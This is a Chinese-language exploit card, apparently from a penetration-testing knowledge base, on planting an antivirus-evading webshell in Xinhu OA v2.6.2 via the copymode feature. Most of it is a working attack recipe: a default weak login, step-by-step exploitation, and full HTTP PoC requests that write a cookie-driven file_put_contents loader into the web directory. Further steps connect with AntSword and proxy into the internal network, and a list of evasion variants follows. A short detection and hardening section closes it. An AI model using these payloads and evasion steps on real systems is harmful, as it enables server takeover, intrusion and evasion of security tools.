---
id: web-php-rce-xinhu-copymode-get-defined-vars-av-bypass
title: 信呼 OA copymode 写马被 AV 拦截后的免杀绕过：get_defined_vars 读 Cookie 参数并二次写入 WebShell
type: scenario
domain: web
path: web/php/rce
technique: xinhu-copymode-get-defined-vars-av-bypass
tags:
- php
- oa
- xinhu
- copymode
- av-evasion
- webshell
- get-defined-vars
- file-write
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: 信呼协同办公系统 v2.6.2（原文页面标注）
verification:
  verified_by: verifier-V208
  verified_at: '2026-11-07T02:28:06+08:00'
  notes: 已对照原文与16张图核对：信呼 v2.6.2 登录页、copymode name 写 phpinfo/访问 404、get_defined_vars/array_values 取 Cookie p/c、file_put_contents 写 shell.php、AntSword 经代理连接均一致；affected_versions=v2.6.2 为原文页面标注版本。未验证点：PoC 未本机复跑；frontmatter 无 sources/source_url。
url: /docs/web/php/rce/web-php-rce-xinhu-copymode-get-defined-vars-av-bypass/
draft: false
kb_aliases:
- 信呼 OA 免杀写马
- copymode AV 绕过
- get_defined_vars 免杀
- Cookie 传参写 shell
- 文件名即代码二次写入
---

## 一句话结论

信呼 OA v2.6.2 的 `copymode` 把 `name` 同时作为生成文件的文件名和内容，直接写入 `eval`/一句话木马会被目标机 AV 删除（访问 404）；改为写入一段只含 `get_defined_vars()`/`array_values()`/`file_put_contents()`/`base64_decode()` 的“正常函数”loader，运行时从 Cookie 取 `p`（落地路径）与 `c`（base64 编码的免杀 shell），把真正的 WebShell 写到 `webmain/flow/input/shell.php`，即可绕过 AV 并连接。

## 原理

- `copymode` 的 `name` 会被拼进生成的 `mode_<name>Action.php` 的文件名与文件内容；因此攻击者提交的 PHP 代码会原样成为文件名的一部分，访问该文件即执行。
- 直接写 `eval($_REQUEST[1])`、`assert($_REQUEST[...])` 这类一句话会形成明确的 WebShell 特征，目标机 AV 的实时文件防护会删除生成文件，表现为访问 404（原文在写入 `eval (strtoupper("eval (\$_request[1]);"))` 后访问即 404）。
- 绕过思路是“把恶意内容移出被扫描的文件”：loader 本身只用常见函数——
  - `get_defined_vars()` 返回当前作用域所有变量（包括 `$_GET`、`$_POST`、`$_COOKIE` 等超全局），形成关联数组；
  - `array_values()` 转成索引数组，`$v[2]` 取到 Cookie 数组（顺序依 PHP 版本/作用域，原文实测可取到）；
  - 从 Cookie 读取自定义 `p`（目标写入路径）和 `c`（base64 编码的 WebShell 内容）；
  - `file_put_contents($c[p], base64_decode($c[c]))` 把解码后的 shell 写到 Web 目录。
- loader 文件中出现的 `get_defined_vars`、`array_values`、`file_put_contents`、`base64_decode` 都是正常业务函数，没有 `eval`/`assert`/`system` 等强特征，AV 静态规则不命中；真正的 shell 内容是经过 base64 + XOR/str_rot13 等混淆的 class，落盘为独立文件后再连接。
- 访问 loader 时会出现 `Use of undefined constant p - assumed 'p'`、`Class 'inputAction' not found` 等 PHP 错误，但 `file_put_contents` 在报错前已执行，文件已写入；这是“边报错边执行”的利用方式。
- 路径由 Cookie `p` 控制（原文为 `C:\phpStudy\WWW\webmain\flow\input\shell.php`），需要 Web 进程对目标目录有写权限；shell 内容由 Cookie `c` 控制，可替换为任意免杀 payload。

## 触发条件

- 目标为信呼 OA v2.6.2 或具有相同 `copymode` 逻辑的版本；普通用户可用默认/弱口令登录（原文 `xiaoqiao/123456`）。
- `copymode` 功能对当前用户开放，`webmain/flow/input/`（或 Cookie 指定的目录）可被 Web 进程写入且可访问。
- 目标启用了基于文件特征的 AV/EDR，会删除直接写入的一句话/eval shell。
- PHP 未禁用 `file_put_contents`、`get_defined_vars`、`array_values`、`base64_decode`；允许 Cookie 中的自定义参数进入超全局数组。

## 利用步骤

1. 用默认/弱口令登录信呼 OA，取得有效 `PHPSESSID` 与 `xinhu_ca_adminuser` 等 Cookie。
2. 验证写入：POST `id=1&name=a{};phpinfo ();class b`，再访问 URL 编码后的 `/webmain/flow/input/mode_a{};phpinfo ();class bAction.php`，确认出现 phpinfo。
3. 直接写一句话/eval shell，访问确认 404，判断为 AV 删除（而非写入失败）。
4. 写入 loader：POST `id=1&name=a{};$v=array_values(get_defined_vars());$c=$v[2];file_put_contents($c[p],base64_decode($c[c]));class d`。
5. 访问 URL 编码后的 loader 文件，并在 Cookie 中附带：
   - `p=C:\phpStudy\WWW\webmain\flow\input\shell.php`（写入路径）
   - `c=<base64 编码的免杀 shell 内容>`
   访问后 loader 执行 `file_put_contents`，在 `p` 指定路径生成 shell。
6. 访问/连接 `shell.php`（AntSword/哥斯拉），按需配置 SOCKS 代理进入内网；验证命令执行或读取无害标记。

## PoC

写入 loader（原文请求，节选）：

```http
POST /index.php?d=main&m=flow&a=copymode&ajaxbool=true HTTP/1.1
Host: <target>
Cookie: PHPSESSID=<session>; xinhu_ca_adminuser=xiaoqiao; ...
Content-Type: application/x-www-form-urlencoded

id=1&name=a{};$v=array_values(get_defined_vars());$c=$v[2];file_put_contents($c[p],base64_decode($c[c]));class d
```

触发 loader 并传参（URL 编码后访问；`p`/`c` 放在 Cookie）：

```http
GET /webmain/flow/input/mode_a%7B%7D%3B$v=array_values%28get_defined_vars%28%29%29%3B$c=$v%5B2%5D%3Bfile_put_contents%28$c%5Bp%5D,base64_decode%28$c%5Bc%5D%29%29%3Bclass%20dAction.php HTTP/1.1
Host: <target>
Cookie: PHPSESSID=<session>; p=C:\phpStudy\WWW\webmain\flow\input\shell.php; c=PD9waHAgZWNobyAib2siOz8+
```

`c` 的值可先用无害内容验证（例如 `<?php echo "ok";?>` 的 base64），确认 `shell.php` 可访问后再替换为实际免杀 payload。原文使用的是一个 base64 编码的 XOR/str_rot13 class 免杀 shell，本卡不复述具体 payload。

## 变体与关联

- 免杀变体：把外部参数放到 Header/GET/POST（`getenv`、`$_SERVER`、`parse_str`）；用 `call_user_func`、`array_map`、`array_filter` 等正常函数间接执行；payload 用 base64/XOR/ROT13/变量拼接混淆。
- 入口变体：其他把用户输入同时作为文件名/内容的功能（模板复制、模型复制、日志写入、缓存写入）都可套用“loader + 二次写入”思路。
- 关联卡：[[web-php-rce-xinhu-oa-copymode-file-write]]（同 copymode 漏洞的基础写入与 passthru/getenv 利用）、[[web-php-rce-no-param-get-defined-vars]]（get_defined_vars 无参取外部参数）、[[web-php-rce-command-injection-blacklist-base64-tee-webshell]]（命令注入黑名单绕过写 WebShell）。
- 边界：若 AV 对 `file_put_contents` 写 Web 目录、或对生成的 loader 做行为/语义检测，仍可能拦截；若 `file_put_contents` 被禁用、目标目录不可写或 Cookie 顺序变化导致 `$v[2]` 取不到 Cookie，需要调整索引/改用其他超全局。

## 检测与防御

- 检测：`copymode` 请求的 `name` 含 `get_defined_vars`、`array_values`、`file_put_contents`、`base64_decode`、`{}`、`;` 等特征；`webmain/flow/input/` 出现 `mode_*` 异常 PHP；访问 `mode_*` 文件时 Cookie 带自定义 `p`/`c`；Web 进程在 Web 目录新建 `shell.php` 等文件。
- 修复：升级信呼 OA 到修复版本；对 `name` 做严格白名单（仅字母数字下划线），禁止拼接进文件名/代码；`copymode` 增加权限校验。
- 加固：修改默认口令；Web 目录只读或禁止 PHP 写入；限制 `file_put_contents` 与 `base64_decode` 的滥用；开启 `open_basedir`；用 AV/EDR 行为检测覆盖“Web 进程写 PHP 文件”。
- 响应：删除 loader 与 shell 文件，审计 `copymode` 与文件访问日志，重置受影响账号口令，排查是否已横向。
